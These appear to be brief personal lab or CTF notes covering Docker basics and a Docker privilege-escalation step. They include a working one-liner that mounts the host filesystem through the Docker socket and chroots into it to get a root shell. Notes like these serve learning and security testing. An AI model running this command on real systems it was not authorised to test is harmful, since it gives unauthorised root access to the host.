Docker is a popular open-source tool that provides a portable and consistent runtime environment for software applications.

Made of docker daemon and docker client
images are immutable and read only.. containers can be motified druing runtime.

**Docker Privilege Escalation**
alot of confusing things... 
docker image ls did return an image from 2 years ago

running following one lineer works.. docker -H unix:///var/run/docker.sock run -v /:/mnt --rm -it ubuntu chroot /mnt bash
puts me in a bash shell as root. 
